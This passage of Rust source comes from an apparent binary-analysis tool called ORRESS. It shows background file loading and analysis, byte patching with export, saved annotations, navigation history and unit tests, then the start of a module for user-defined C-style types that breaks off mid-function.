`crates/orress-project/src/lib.rs`:

```rs
//! Open documents and their shared state.
//!
//! A [`Document`] is one opened file. Reading and analysis run on a background thread
//! so the interface never freezes; views show what is ready and fill in the rest when
//! the work finishes. All views of a document share its cursor, which is how clicking
//! a string or a section moves the hex view and updates the inspector.

mod annotations;
pub mod types;

use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, OnceLock};

pub use annotations::{Annotations, validate_name};
pub use orress_analysis::Program;
use orress_bytes::Endian;
use orress_bytes::strings::FoundString;
use orress_loaders::BinaryInfo;
pub use types::{FieldDef, FuncProto, LaidField, Prim, TypeCatalog, TypeRef, UserType, references};

/// Navigation history depth.
const MAX_HISTORY: usize = 200;

/// Largest file ORRESS loads fully into memory.
pub const MAX_FILE_SIZE: u64 = 1024 * 1024 * 1024;
/// Minimum characters for the strings list.
pub const MIN_STRING_LEN: usize = 4;
/// Cap on extracted strings, so random data cannot exhaust memory.
pub const MAX_STRINGS: usize = 500_000;
/// Number of blocks in the entropy overview.
pub const ENTROPY_BLOCKS: usize = 2048;

/// Results of the background analysis.
pub struct Analysis {
    pub info: BinaryInfo,
    pub strings: Vec<FoundString>,
    pub entropy: Vec<f32>,
    /// Bytes per entry in `entropy`.
    pub entropy_block: usize,
}

impl Analysis {
    pub fn run(data: &[u8]) -> Self {
        let info = orress_loaders::triage(data);
        let strings = orress_bytes::strings::extract(data, MIN_STRING_LEN, MAX_STRINGS);
        let entropy_block = orress_bytes::entropy::block_size_for(data.len(), ENTROPY_BLOCKS);
        let entropy = orress_bytes::entropy::blocks(data, entropy_block);
        Self {
            info,
            strings,
            entropy,
            entropy_block,
        }
    }
}

pub type Bytes = Arc<Vec<u8>>;

pub struct Document {
    pub path: PathBuf,
    data: Arc<OnceLock<Result<Bytes, String>>>,
    analysis: Arc<OnceLock<Arc<Analysis>>>,
    /// Code analysis; `Some(None)` when the architecture is not supported.
    program: Arc<OnceLock<Option<Arc<Program>>>>,
    /// The file as read from disk, before patches.
    original: Arc<OnceLock<Bytes>>,
    notify: Arc<dyn Fn() + Send + Sync>,
    /// Coalesces re-analysis after patches (one worker, latest request wins).
    rebuilds: Arc<Mutex<RebuildQueue>>,
    /// Your names, comments and bookmarks (loaded once the file hash is known).
    pub annotations: Annotations,
    annotations_file: Option<PathBuf>,
    annotations_loaded: bool,
    /// Last error loading or saving annotations, for the UI to show.
    pub annotations_error: Option<String>,
    /// Increases on every annotation change, so views can refresh cached layouts.
    pub generation: u64,
    back: Vec<u64>,
    forward: Vec<u64>,
    /// Address the cross-references panel is pinned to (set with X in the disassembly). While
    /// `None`, the panel follows the function under the cursor.
    pub xref_target: Option<u64>,
    /// Shared cursor: the byte offset all views of this document point at.
    pub cursor: u64,
    /// Selected byte range (inclusive start, exclusive end), if any.
    pub selection: Option<(u64, u64)>,
    /// Set by a view that wants the hex view to scroll to the cursor.
    pub reveal: bool,
    /// Byte order the inspector uses.
    pub endian: Endian,
}

impl Document {
    fn open(path: PathBuf, notify: Arc<dyn Fn() + Send + Sync>) -> Self {
        let original = Arc::new(OnceLock::new());
        let slots = Slots::default();
        spawn_load(
            path.clone(),
            Source::File(Arc::clone(&original)),
            &slots,
            Arc::clone(&notify),
        );
        Self {
            path,
            data: slots.data,
            analysis: slots.analysis,
            program: slots.program,
            original,
            notify,
            rebuilds: Arc::default(),
            annotations: Annotations::default(),
            annotations_file: None,
            annotations_loaded: false,
            annotations_error: None,
            generation: 0,
            back: Vec::new(),
            forward: Vec::new(),
            xref_target: None,
            cursor: 0,
            selection: None,
            reveal: false,
            endian: Endian::Little,
        }
    }

    /// Re-runs loading and analysis on the original bytes with all patches applied.
    fn rebuild(&mut self) {
        let Some(original) = self.original.get() else {
            return;
        };
        let mut bytes = original.as_ref().clone();
        for (&offset, &value) in &self.annotations.patches {
            if let Some(b) = usize::try_from(offset).ok().and_then(|o| bytes.get_mut(o)) {
                *b = value;
            }
        }
        let bytes = Arc::new(bytes);
        let slots = Slots::default();
        // The bytes are known now; only the analysis needs the background thread. Patching
        // byte by byte calls this often, so requests are queued: one worker analyzes the
        // newest bytes and drops any request that a later patch has already replaced.
        let _ = slots.data.set(Ok(Arc::clone(&bytes)));
        queue_rebuild(
            &self.rebuilds,
            self.path.clone(),
            bytes,
            slots.clone(),
            Arc::clone(&self.notify),
        );
        self.data = slots.data;
        self.analysis = slots.analysis;
        self.program = slots.program;
        self.generation += 1;
    }

    /// Changes bytes at `offset`. Bytes that equal the original remove their patch.
    /// The file on disk is not touched; use [`Document::export`] to save a copy.
    pub fn patch(&mut self, offset: u64, bytes: &[u8]) -> Result<(), String> {
        let original = self
            .original
            .get()
            .ok_or("the file is still loading")?
            .clone();
        let end = offset
            .checked_add(bytes.len() as u64)
            .filter(|&e| e <= original.len() as u64)
            .ok_or("the patch goes past the end of the file")?;
        for (off, &value) in (offset..end).zip(bytes) {
            if original[off as usize] == value {
                self.annotations.patches.remove(&off);
            } else {
                self.annotations.patches.insert(off, value);
            }
        }
        self.save_annotations();
        self.rebuild();
        Ok(())
    }

    /// Removes all patches.
    pub fn revert_patches(&mut self) {
        if self.annotations.patches.is_empty() {
            return;
        }
        self.annotations.patches.clear();
        self.save_annotations();
        self.rebuild();
    }

    pub fn is_patched(&self, offset: u64) -> bool {
        self.annotations.patches.contains_key(&offset)
    }

    /// The original (unpatched) byte at `offset`.
    pub fn original_byte(&self, offset: u64) -> Option<u8> {
        self.original
            .get()?
            .get(usize::try_from(offset).ok()?)
            .copied()
    }

    /// Writes the current (patched) bytes to `path`.
    pub fn export(&self, path: &Path) -> Result<(), String> {
        if path == self.path {
            return Err("refusing to overwrite the original file; choose another name".into());
        }
        let bytes = self.bytes().ok_or("the file is still loading")?;
        std::fs::write(path, bytes.as_slice()).map_err(|e| format!("{}: {e}", path.display()))
    }

    /// `None` while still reading the file.
    pub fn data(&self) -> Option<&Result<Bytes, String>> {
        self.data.get()
    }

    pub fn bytes(&self) -> Option<&Bytes> {
        self.data.get().and_then(|r| r.as_ref().ok())
    }

    /// `None` while the analysis is still running (or if loading failed).
    pub fn analysis(&self) -> Option<&Arc<Analysis>> {
        self.analysis.get()
    }

    /// `None` while disassembling; `Some(None)` if the architecture is not supported.
    pub fn program_state(&self) -> Option<Option<&Arc<Program>>> {
        self.program.get().map(Option::as_ref)
    }

    pub fn program(&self) -> Option<&Arc<Program>> {
        self.program.get().and_then(Option::as_ref)
    }

    /// Loads saved annotations once the file's hash is known.
    fn load_annotations(&mut self, dir: Option<&Path>) {
        if self.annotations_loaded {
            return;
        }
        let Some(analysis) = self.analysis.get() else {
            return;
        };
        self.annotations_loaded = true;
        let sha = analysis.info.hashes.sha256.clone();
        self.annotations = Annotations::new(&sha, &self.path);
        let Some(dir) = dir else {
            return;
        };
        let file = Annotations::file_for(dir, &sha);
        match Annotations::load(&file) {
            Ok(Some(saved)) => {
                self.annotations = saved;
                self.annotations.last_path = Some(self.path.clone());
            }
            Ok(None) => {}
            Err(e) => {
                // Never overwrite a file we could not read: move it aside first, and if
                // that fails keep the annotations in memory only.
                let mut backup = file.clone().into_os_string();
                backup.push(".corrupt");
                let backup = PathBuf::from(backup);
                if let Err(re) = std::fs::rename(&file, &backup) {
                    self.annotations_error = Some(format!(
                        "{e} (could not move it aside: {re}; changes stay in memory only)"
                    ));
                    return;
                }
                self.annotations_error = Some(format!(
                    "{e} (the unreadable file was kept as {})",
                    backup.display()
                ));
            }
        }
        self.annotations_file = Some(file);
        if !self.annotations.patches.is_empty() {
            self.rebuild();
        }
    }

    fn save_annotations(&mut self) {
        self.generation += 1;
        if let Some(file) = &self.annotations_file {
            self.annotations_error = self.annotations.save(file).err();
        }
    }

    /// Marks the annotations changed (bumps `generation` so views refresh, and persists). Use after
    /// mutating [`Document::annotations`] directly — e.g. when applying a teammate's shared edits.
    pub fn touch_annotations(&mut self) {
        self.save_annotations();
    }

    /// Renames `addr`. An empty name removes your name and shows the original again.
    pub fn rename(&mut self, addr: u64, name: &str) -> Result<(), String> {
        validate_name(name)?;
        let name = name.trim();
        if name.is_empty() {
            self.annotations.names.remove(&addr);
        } else {
            self.annotations.names.insert(addr, name.to_owned());
        }
        self.save_annotations();
        Ok(())
    }

    /// Sets the comment at `addr`; empty removes it.
    pub fn set_comment(&mut self, addr: u64, text: &str) {
        let text = text.trim();
        if text.is_empty() {
            self.annotations.comments.remove(&addr);
        } else {
            self.annotations.comments.insert(addr, text.to_owned());
        }
        self.save_annotations();
    }

    /// The user's type catalog, with the pointer size set from this binary's bitness.
    pub fn type_catalog(&self) -> TypeCatalog {
        let bits = self.analysis.get().and_then(|a| a.info.bits);
        TypeCatalog::new(self.annotations.types.clone(), bits)
    }

    /// Defines or replaces a user type. Validated against the current catalog.
    pub fn define_type(&mut self, ty: UserType) -> Result<(), String> {
        self.type_catalog().validate(&ty)?;
        self.annotations.types.insert(ty.name().to_owned(), ty);
        self.save_annotations();
        Ok(())
    }

    /// Removes a user type by name, and any data applications that referenced it.
    pub fn remove_type(&mut self, name: &str) {
        if self.annotations.types.remove(name).is_some() {
            self.annotations
                .data_types
                .retain(|_, t| !references(t, name));
            self.save_annotations();
        }
    }

    /// Applies a type to a data address.
    pub fn apply_data_type(&mut self, addr: u64, ty: TypeRef) {
        self.annotations.data_types.insert(addr, ty);
        self.save_annotations();
    }

    /// Removes any type applied at `addr`.
    pub fn clear_data_type(&mut self, addr: u64) {
        if self.annotations.data_types.remove(&addr).is_some() {
            self.save_annotations();
        }
    }

    /// Pins a function prototype to `addr` (consumed by the decompiler).
    pub fn set_prototype(&mut self, addr: u64, proto: FuncProto) {
        self.annotations.func_prototypes.insert(addr, proto);
        self.save_annotations();
    }

    /// Removes any prototype pinned to `addr`.
    pub fn clear_prototype(&mut self, addr: u64) {
        if self.annotations.func_prototypes.remove(&addr).is_some() {
            self.save_annotations();
        }
    }

    pub fn toggle_bookmark(&mut self, addr: u64) {
        if !self.annotations.bookmarks.remove(&addr) {
            self.annotations.bookmarks.insert(addr);
        }
        self.save_annotations();
    }

    /// Name shown for `addr`: yours first, then what the analysis found.
    pub fn name_of(&self, addr: u64) -> Option<String> {
        if let Some(n) = self.annotations.names.get(&addr) {
            return Some(n.clone());
        }
        self.program()?.name(addr).map(|n| n.text.clone())
    }

    /// Memory address of the cursor, if the cursor is inside a loaded section.
    pub fn cursor_address(&self) -> Option<u64> {
        self.analysis.get()?.info.offset_to_address(self.cursor)
    }

    pub fn address_to_offset(&self, addr: u64) -> Option<u64> {
        self.analysis.get()?.info.address_to_offset(addr)
    }

    /// Jumps to a memory address, remembering where you came from (Esc goes back).
    pub fn navigate_to_address(&mut self, addr: u64) -> bool {
        match self.address_to_offset(addr) {
            Some(offset) => {
                self.navigate(offset);
                true
            }
            None => false,
        }
    }

    /// Jumps to a file offset, remembering where you came from.
    pub fn navigate(&mut self, offset: u64) {
        if offset != self.cursor {
            self.back.push(self.cursor);
            if self.back.len() > MAX_HISTORY {
                self.back.remove(0);
            }
            self.forward.clear();
        }
        self.go_to(offset);
    }

    pub fn go_back(&mut self) -> bool {
        match self.back.pop() {
            Some(offset) => {
                self.forward.push(self.cursor);
                self.go_to(offset);
                true
            }
            None => false,
        }
    }

    pub fn go_forward(&mut self) -> bool {
        match self.forward.pop() {
            Some(offset) => {
                self.back.push(self.cursor);
                self.go_to(offset);
                true
            }
            None => false,
        }
    }

    pub fn len(&self) -> u64 {
        self.bytes().map_or(0, |b| b.len() as u64)
    }

    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    pub fn file_name(&self) -> String {
        file_name(&self.path)
    }

    /// Moves the cursor and asks the hex view to scroll there. Clears the selection.
    pub fn go_to(&mut self, offset: u64) {
        self.cursor = offset.min(self.len().saturating_sub(1));
        self.selection = None;
        self.reveal = true;
    }

    /// Selects `len` bytes at `offset` and reveals them.
    pub fn select(&mut self, offset: u64, len: u64) {
        self.go_to(offset);
        if len > 0 {
            let end = self.cursor.saturating_add(len).min(self.len());
            self.selection = Some((self.cursor, end.max(self.cursor)));
        }
    }
}

/// Where loading gets its bytes.
enum Source {
    /// Read the file; the bytes are also stored as the document's original.
    File(Arc<OnceLock<Bytes>>),
}

#[derive(Default, Clone)]
struct Slots {
    data: Arc<OnceLock<Result<Bytes, String>>>,
    analysis: Arc<OnceLock<Arc<Analysis>>>,
    program: Arc<OnceLock<Option<Arc<Program>>>>,
}

/// Loads and analyzes on a background thread, filling `slots` as results arrive.
fn spawn_load(path: PathBuf, source: Source, slots: &Slots, notify: Arc<dyn Fn() + Send + Sync>) {
    let data = Arc::clone(&slots.data);
    let analysis = Arc::clone(&slots.analysis);
    let program = Arc::clone(&slots.program);
    let error_slot = Arc::clone(&slots.data);
    let spawned = std::thread::Builder::new()
        .name(format!("load {}", path.display()))
        .spawn(move || {
            let loaded = match source {
                Source::File(original) => {
                    let loaded = read(&path);
                    if let Ok(bytes) = &loaded {
                        let _ = original.set(Arc::clone(bytes));
                    }
                    loaded
                }
            };
            let bytes = loaded.as_ref().ok().cloned();
            let _ = data.set(loaded);
            notify();
            let Some(bytes) = bytes else {
                return;
            };
            analyze_into(&path, bytes, &analysis, &program, notify.as_ref(), || false);
        });
    if let Err(e) = spawned {
        let _ = error_slot.set(Err(format!("could not start loader thread: {e}")));
    }
}

/// Triage, then code analysis, filling the slots as each finishes. `stale` is checked
/// between the steps; when it returns true the rest is skipped (a newer request exists).
fn analyze_into(
    path: &Path,
    bytes: Bytes,
    analysis: &OnceLock<Arc<Analysis>>,
    program: &OnceLock<Option<Arc<Program>>>,
    notify: &(dyn Fn() + Send + Sync),
    stale: impl Fn() -> bool,
) {
    let started = std::time::Instant::now();
    let triaged = Arc::new(Analysis::run(&bytes));
    if stale() {
        return;
    }
    let _ = analysis.set(Arc::clone(&triaged));
    tracing::info!("triaged {} in {:.2?}", path.display(), started.elapsed());
    notify();
    let started = std::time::Instant::now();
    let analyzed = Program::analyze(&triaged.info, bytes, &triaged.strings).map(Arc::new);
    if stale() {
        return;
    }
    if let Some(p) = &analyzed {
        tracing::info!(
            "disassembled {}: {} functions in {:.2?}",
            path.display(),
            p.functions.len(),
            started.elapsed()
        );
    }
    let _ = program.set(analyzed);
    notify();
}

/// Pending re-analysis for one document.
#[derive(Default)]
struct RebuildQueue {
    /// The newest bytes still waiting to be analyzed (older ones are simply replaced).
    pending: Option<(Bytes, Slots)>,
    /// Whether a worker thread is draining the queue.
    running: bool,
}

/// Queues analysis of patched `bytes` into `slots`. At most one worker runs per document;
/// it always picks the newest request and abandons work that a newer request made stale,
/// so a burst of patches costs about one analysis instead of one per byte.
fn queue_rebuild(
    queue: &Arc<Mutex<RebuildQueue>>,
    path: PathBuf,
    bytes: Bytes,
    slots: Slots,
    notify: Arc<dyn Fn() + Send + Sync>,
) {
    let mut q = queue.lock().unwrap_or_else(|e| e.into_inner());
    q.pending = Some((bytes, slots));
    if q.running {
        return;
    }
    q.running = true;
    drop(q);
    let worker_queue = Arc::clone(queue);
    let spawned = std::thread::Builder::new()
        .name(format!("reanalyze {}", path.display()))
        .spawn(move || {
            let lock = || worker_queue.lock().unwrap_or_else(|e| e.into_inner());
            loop {
                let next = {
                    let mut q = lock();
                    let next = q.pending.take();
                    if next.is_none() {
                        q.running = false;
                    }
                    next
                };
                let Some((bytes, slots)) = next else {
                    return;
                };
                let stale = || lock().pending.is_some();
                let worked = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                    analyze_into(
                        &path,
                        bytes,
                        &slots.analysis,
                        &slots.program,
                        notify.as_ref(),
                        stale,
                    );
                }));
                if worked.is_err() {
                    tracing::error!("re-analysis of {} panicked", path.display());
                }
            }
        });
    if let Err(e) = spawned {
        tracing::error!("could not start re-analysis thread: {e}");
        let mut q = queue.lock().unwrap_or_else(|e| e.into_inner());
        q.running = false;
        q.pending = None;
    }
}

pub fn file_name(path: &Path) -> String {
    path.file_name().map_or_else(
        || path.display().to_string(),
        |n| n.to_string_lossy().into_owned(),
    )
}

fn read(path: &Path) -> Result<Bytes, String> {
    let meta = std::fs::metadata(path).map_err(|e| format!("{}: {e}", path.display()))?;
    if !meta.is_file() {
        return Err(format!("{} is not a file", path.display()));
    }
    if meta.len() > MAX_FILE_SIZE {
        return Err(format!(
            "{} is {} MB; ORRESS currently opens files up to {} MB.",
            path.display(),
            meta.len() / (1024 * 1024),
            MAX_FILE_SIZE / (1024 * 1024)
        ));
    }
    std::fs::read(path)
        .map(Arc::new)
        .map_err(|e| format!("{}: {e}", path.display()))
}

/// All open documents.
pub struct DocStore {
    docs: Vec<Document>,
    /// The document whose view was focused last; the inspector follows it.
    pub active: Option<PathBuf>,
    notify: Arc<dyn Fn() + Send + Sync>,
    /// Where annotations are saved; `None` keeps them in memory only.
    projects_dir: Option<PathBuf>,
}

impl DocStore {
    /// `notify` is called from a background thread when loading or analysis finishes;
    /// the app passes a function that requests a repaint.
    pub fn new(notify: impl Fn() + Send + Sync + 'static, projects_dir: Option<PathBuf>) -> Self {
        Self {
            docs: Vec::new(),
            active: None,
            notify: Arc::new(notify),
            projects_dir,
        }
    }

    /// Opens `path`, or returns the already open document.
    pub fn open(&mut self, path: &Path) -> &mut Document {
        let index = match self.docs.iter().position(|d| d.path == path) {
            Some(i) => i,
            None => {
                self.docs
                    .push(Document::open(path.to_path_buf(), Arc::clone(&self.notify)));
                self.docs.len() - 1
            }
        };
        let doc = &mut self.docs[index];
        doc.load_annotations(self.projects_dir.as_deref());
        doc
    }

    pub fn get(&self, path: &Path) -> Option<&Document> {
        self.docs.iter().find(|d| d.path == path)
    }

    pub fn get_mut(&mut self, path: &Path) -> Option<&mut Document> {
        self.docs.iter_mut().find(|d| d.path == path)
    }

    pub fn active(&self) -> Option<&Document> {
        self.active.as_deref().and_then(|p| self.get(p))
    }

    pub fn active_mut(&mut self) -> Option<&mut Document> {
        let path = self.active.clone()?;
        self.get_mut(&path)
    }

    pub fn iter(&self) -> impl Iterator<Item = &Document> {
        self.docs.iter()
    }

    /// Drops documents that no tab shows any more, freeing their memory.
    pub fn retain(&mut self, mut in_use: impl FnMut(&Path) -> bool) {
        self.docs.retain(|d| in_use(&d.path));
        if self
            .active
            .as_deref()
            .is_some_and(|p| self.get(p).is_none())
        {
            self.active = None;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    fn wait_for(doc: &Document) {
        let start = Instant::now();
        while doc.analysis().is_none() && doc.data().is_none_or(Result::is_ok) {
            assert!(
                start.elapsed() < Duration::from_secs(30),
                "analysis timed out"
            );
            std::thread::sleep(Duration::from_millis(5));
        }
    }

    #[test]
    fn opens_and_analyzes_in_background() {
        let path =
            std::env::temp_dir().join(format!("orress-project-test-{}.bin", std::process::id()));
        std::fs::write(&path, b"\x00\x00hello flag{x}\x00").unwrap();
        let mut store = DocStore::new(|| {}, None);
        let doc = store.open(&path);
        wait_for(doc);
        let analysis = doc.analysis().expect("analysis done");
        assert_eq!(analysis.strings[0].text, "hello flag{x}");
        assert_eq!(doc.len(), 16);

        doc.select(2, 5);
        assert_eq!(doc.selection, Some((2, 7)));
        assert!(doc.reveal);
        doc.go_to(1_000);
        assert_eq!(doc.cursor, 15, "cursor is clamped to the file");

        // Opening again returns the same document.
        store.open(&path).cursor = 3;
        assert_eq!(store.iter().count(), 1);
        assert_eq!(store.get(&path).unwrap().cursor, 3);

        store.active = Some(path.clone());
        store.retain(|_| false);
        assert!(store.active.is_none());
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn history_and_annotations_persist() {
        let dir = std::env::temp_dir().join(format!("orress-history-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("sample.bin");
        std::fs::write(&path, vec![0x90u8; 256]).unwrap();
        let projects = dir.join("projects");

        let mut store = DocStore::new(|| {}, Some(projects.clone()));
        wait_for(store.open(&path));
        let doc = store.open(&path);
        doc.navigate(0x10);
        doc.navigate(0x20);
        assert!(doc.go_back());
        assert_eq!(doc.cursor, 0x10);
        assert!(doc.go_forward());
        assert_eq!(doc.cursor, 0x20);
        assert!(doc.rename(0x1000, "has space").is_err());
        doc.rename(0x1000, "check_flag").unwrap();
        doc.set_comment(0x1004, "xor key is 0x42");
        assert_eq!(doc.name_of(0x1000).as_deref(), Some("check_flag"));
        assert!(doc.annotations_error.is_none());

        // A new store (a restart) brings the annotations back.
        let mut again = DocStore::new(|| {}, Some(projects));
        wait_for(again.open(&path));
        let doc = again.open(&path);
        assert_eq!(
            doc.annotations.names.get(&0x1000).map(String::as_str),
            Some("check_flag")
        );
        assert_eq!(doc.annotations.comments.len(), 1);
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn patches_apply_export_and_persist() {
        let dir = std::env::temp_dir().join(format!("orress-patch-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("target.bin");
        std::fs::write(&path, b"\x74\x05hello").unwrap();
        let projects = dir.join("projects");

        let mut store = DocStore::new(|| {}, Some(projects.clone()));
        wait_for(store.open(&path));
        let doc = store.open(&path);
        // jz -> jnz: change one byte.
        doc.patch(0, &[0x75]).unwrap();
        assert!(doc.is_patched(0));
        assert_eq!(doc.original_byte(0), Some(0x74));
        wait_for(doc);
        assert_eq!(
            doc.bytes().unwrap()[0],
            0x75,
            "current bytes include the patch"
        );
        assert!(doc.patch(6, &[1, 2, 3]).is_err(), "past the end");
        // Writing the original value back removes the patch.
        doc.patch(1, &[0x05]).unwrap();
        assert_eq!(doc.annotations.patches.len(), 1);

        let out = dir.join("target.patched.bin");
        assert!(doc.export(&path).is_err(), "never overwrite the original");
        doc.export(&out).unwrap();
        assert_eq!(std::fs::read(&out).unwrap(), b"\x75\x05hello");
        assert_eq!(std::fs::read(&path).unwrap()[0], 0x74, "original untouched");

        // A restart applies saved patches again.
        let mut again = DocStore::new(|| {}, Some(projects));
        wait_for(again.open(&path));
        let doc = again.open(&path);
        wait_for(doc);
        assert_eq!(doc.bytes().unwrap()[0], 0x75);
        doc.revert_patches();
        wait_for(doc);
        assert_eq!(doc.bytes().unwrap()[0], 0x74);
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn burst_of_patches_ends_with_fresh_analysis() {
        let path =
            std::env::temp_dir().join(format!("orress-burst-test-{}.bin", std::process::id()));
        std::fs::write(&path, vec![0u8; 4096]).unwrap();
        let mut store = DocStore::new(|| {}, None);
        let doc = store.open(&path);
        wait_for(doc);
        for i in 0..64u64 {
            doc.patch(i, b"A").unwrap();
        }
        wait_for(doc);
        let analysis = doc.analysis().expect("the newest patch is analyzed");
        assert!(analysis.strings.iter().any(|s| s.text.len() == 64));
        doc.select(10, u64::MAX);
        assert_eq!(doc.selection, Some((10, 4096)), "no overflow");
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn corrupt_annotations_are_never_overwritten() {
        let dir = std::env::temp_dir().join(format!("orress-corrupt-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("sample.bin");
        std::fs::write(&path, vec![0x90u8; 64]).unwrap();
        let projects = dir.join("projects");
        let mut store = DocStore::new(|| {}, None);
        let doc = store.open(&path);
        wait_for(doc);
        let sha = doc.analysis().unwrap().info.hashes.sha256.clone();
        std::fs::create_dir_all(&projects).unwrap();
        let file = Annotations::file_for(&projects, &sha);
        std::fs::write(&file, "{ not json").unwrap();

        let mut store = DocStore::new(|| {}, Some(projects));
        wait_for(store.open(&path));
        let doc = store.open(&path);
        assert!(doc.annotations_error.is_some());
        doc.rename(0x10, "fresh").unwrap();
        let mut backup = file.clone().into_os_string();
        backup.push(".corrupt");
        assert_eq!(std::fs::read_to_string(backup).unwrap(), "{ not json");
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn missing_file_reports_error() {
        let mut store = DocStore::new(|| {}, None);
        let doc = store.open(Path::new("definitely/not/here.exe"));
        wait_for(doc);
        assert!(doc.data().unwrap().is_err());
        assert!(doc.analysis().is_none());
    }
}

`crates/orress-project/src/types.rs`:

```rs
//! User-defined types: structs, unions, enums and typedefs the analyst declares and
//! applies to data. Pure data plus C-style layout (size, alignment, field offsets); the
//! GUI (the Types view) and persistence ([`crate::Annotations`]) are built on top.
//!
//! Types are resolved through a [`TypeCatalog`], which also knows the binary's pointer
//! size so a `Pointer` (and a struct holding one) sizes correctly on 32- and 64-bit
//! targets.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};

use crate::annotations::validate_name;

/// A built-in scalar type.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum Prim {
    U8,
    I8,
    U16,
    I16,
    U32,
    I32,
    U64,
    I64,
    F32,
    F64,
    Bool,
    Char,
    /// A zero-sized placeholder; only meaningful behind a pointer (`void *`).
    Void,
}

impl Prim {
    /// Size in bytes (`Void` is 0).
    pub fn size(self) -> u64 {
        match self {
            Self::U8 | Self::I8 | Self::Bool | Self::Char => 1,
            Self::U16 | Self::I16 => 2,
            Self::U32 | Self::I32 | Self::F32 => 4,
            Self::U64 | Self::I64 | Self::F64 => 8,
            Self::Void => 0,
        }
    }

    /// Natural alignment in bytes (`Void` aligns to 1).
    pub fn align(self) -> u64 {
        self.size().max(1)
    }

    /// The name shown in the UI and the layout preview.
    pub fn label(self) -> &'static str {
        match self {
            Self::U8 => "u8",
            Self::I8 => "i8",
            Self::U16 => "u16",
            Self::I16 => "i16",
            Self::U32 => "u32",
            Self::I32 => "i32",
            Self::U64 => "u64",
            Self::I64 => "i64",
            Self::F32 => "f32",
            Self::F64 => "f64",
            Self::Bool => "bool",
            Self::Char => "char",
            Self::Void => "void",
        }
    }

    /// Every primitive, for building a dropdown.
    pub const ALL: [Prim; 13] = [
        Prim::U8,
        Prim::I8,
        Prim::U16,
        Prim::I16,
        Prim::U32,
        Prim::I32,
        Prim::U64,
        Prim::I64,
        Prim::F32,
        Prim::F64,
        Prim::Bool,
        Prim::Char,
        Prim::Void,
    ];
}

/// A reference to a type: a primitive, a pointer to another type, or a named user type.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum TypeRef {
    Prim(Prim),
    /// `*T`. Breaks recursion cycles, so a struct may point to itself.
    Pointer(Box<TypeRef>),
    /// Another user type, by name.
    Named(String),
}

impl TypeRef {
    /// A readable form for the layout preview (`u32`, `*Node`, `Packet`).
    pub fn label(&self) -> String {
        match self {
            Self::Prim(p) => p.label().to_owned(),
            Self::Pointer(inner) => format!("*{}", inner.label()),
            Self::Named(name) => name.clone(),
        }
    }
}

/// One field of a struct or union: a name, a type, and an array count (`1` = scalar).
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct FieldDef {
    pub name: String,
    pub ty: TypeRef,
    /// Array length; always at least 1.
    pub count: u64,
}

/// A user-defined type.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum UserType {
    Struct {
        name: String,
        fields: Vec<FieldDef>,
    },
    Union {
        name: String,
        fields: Vec<FieldDef>,
    },
    Enum {
        name: String,
        /// Underlying integer width (an integer primitive).
        width: Prim,
        variants: Vec<(String, i64)>,
    },
    Typedef {
        name: String,
        target: TypeRef,
    },
}

impl UserType {
    pub fn name(&self) -> &str {
        match self {
            Self::Struct { name, .. }
            | Self::Union { name, .. }
            | Self::Enum { name, .. }
            | Self::Typedef { name, .. } => name,
        }
    }

    /// The word shown in the UI for this kind of type.
    pub fn kind_label(&self) -> &'static str {
        match self {
            Self::Struct { .. } => "struct",
            Self::Union { .. } => "union",
            Self::Enum { .. } => "enum",
            Self::Typedef { .. } => "typedef",
        }
    }
}

/// An applied function prototype: the return type and named, typed parameters the user
/// has pinned to a function. Consumed by the decompiler (Phase B) to override its
/// recovered signature.
#[derive(Clone, Debug, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct FuncProto {
    pub ret: Option<TypeRef>,
    pub params: Vec<(String, TypeRef)>,
}

/// One field placed in memory: its dotted path, element type, offset and total size.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct LaidField {
    pub path: String,
    pub ty: TypeRef,
    /// Array length (`1` for a scalar), carried through so the UI can show `[N]`.
    pub count: u64,
    pub offset: u64,
    /// Total size of this field (element size × count).
    pub size: u64,
}

/// The catalog of user types for one binary, plus the pointer size to resolve `Pointer`.
#[derive(Clone, Debug)]
pub struct TypeCatalog {
    pub types: BTreeMap<String, UserType>,
    pub pointer_size: u64,
}

impl Default for TypeCatalog {
    fn default() -> Self {
        Self {
            types: BTreeMap::new(),
            pointer_size: 8,
        }
    }
}

impl TypeCatalog {
    /// Builds a catalog from a type map and a binary bitness (`Some(32)`/`Some(64)`).
    pub fn new(types: BTreeMap<String, UserType>, bits: Option<u8>) -> Self {
        Self {
            types,
            pointer_size: if bits == Some(32) { 4 } else { 8 },
        }
    }

    /// Size of a type reference, or `None` if a named type is missing or forms a
    /// by-value cycle.
    pub fn size_of(&self, ty: &TypeRef) -> Option<u64> {
        self.size_of_guarded(ty, &mut BTreeSet::new())
    }

    /// Alignment of a type reference.
    pub fn align_of(&self, ty: &TypeRef) -> Option<u64> {
        self.align_of_guarded(ty, &mut BTreeSet::new())
    }

    fn size_of_guarded(&self, ty: &TypeRef, seen: &mut BTreeSet<String>) -> Option<u64> {
        match ty {
            TypeRef::Prim(p) => Some(p.size()),
            TypeRef::Pointer(_) => Some(self.pointer_size),
            TypeRef::Named(name) => {
                if !seen.insert(name.clone()) {
                    return None; // by-value cycle
                }
                let out = self.named_size(name, seen);
                seen.remove(name);
                out
            }
        }
    }

    fn align_of_guarded(&self, ty: &TypeRef, seen: &mut BTreeSet<String>) -> Option<u64> {
        match ty {
            TypeRef::Prim(p) => Some(p.align()),
            TypeRef::Pointer(_) => Some(self.pointer_size),
